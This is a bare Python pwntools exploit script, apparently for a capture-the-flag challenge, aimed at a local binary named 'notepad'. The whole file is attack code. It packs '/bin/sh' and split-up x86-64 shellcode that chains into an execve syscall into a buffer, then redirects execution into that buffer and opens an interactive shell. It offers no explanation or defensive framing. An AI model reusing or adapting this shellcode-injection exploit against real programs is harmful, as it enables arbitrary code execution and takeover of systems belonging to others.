#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

p = process('./notepad')
pause()

notepad = 0x6010c0

payload = flat(
    "/bin/sh\0",
    asm('nop') * 0x8,

    asm('''
    push 0x3b
    push 0x6010e0
    ret
    '''),
    asm('nop') * 0x8,

    asm('''
    pop rax
    push 0x6010f0
    ret
    '''),
    asm('nop') * 0x9,

    asm('''
    xor rsi, rsi
    push 0x601100
    ret
    '''),
    asm('nop') * 0x7,

    asm('''
    mov rdi, 0x6010c0
    syscall
    '''),
    asm('nop') * 0x4f,

    notepad + 0x10
)

p.sendlineafter(':', payload)

p.interactive()
p.close()
